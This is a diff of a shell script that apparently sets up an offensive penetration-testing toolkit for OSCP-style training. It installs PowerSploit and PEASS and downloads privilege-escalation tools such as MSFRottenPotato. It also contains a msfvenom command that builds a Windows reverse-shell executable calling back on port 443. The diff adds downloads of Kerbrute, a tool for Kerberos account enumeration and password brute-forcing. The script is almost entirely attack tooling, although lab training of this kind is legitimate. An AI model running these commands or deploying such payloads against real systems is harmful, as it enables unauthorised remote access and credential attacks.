@@ -25,6 +25,7 @@
 # - multi_server.exe
 # - upload.ps1
 # - met.exe
+# - Kerbrute
 
 sudo apt install -y powersploit peass windows-binaries
 
@@ -80,6 +81,10 @@ wget https://github.com/adann0/multi_server/releases/download/v0.0.1/multi_serve
 wget https://raw.githubusercontent.com/adann0/multi_server/main/upload.ps1
 
 msfvenom -p windows/shell/reverse_tcp LHOST='tun0' LPORT=443 -f exe > met.exe
+
+wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe
+wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe
+wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
 
 wget https://github.com/adann0/oscp-tools/blob/main/bin/MSFRottenPotato.exe
 wget https://github.com/adann0/oscp-tools/blob/main/bin/MSFRottenPotato.lib
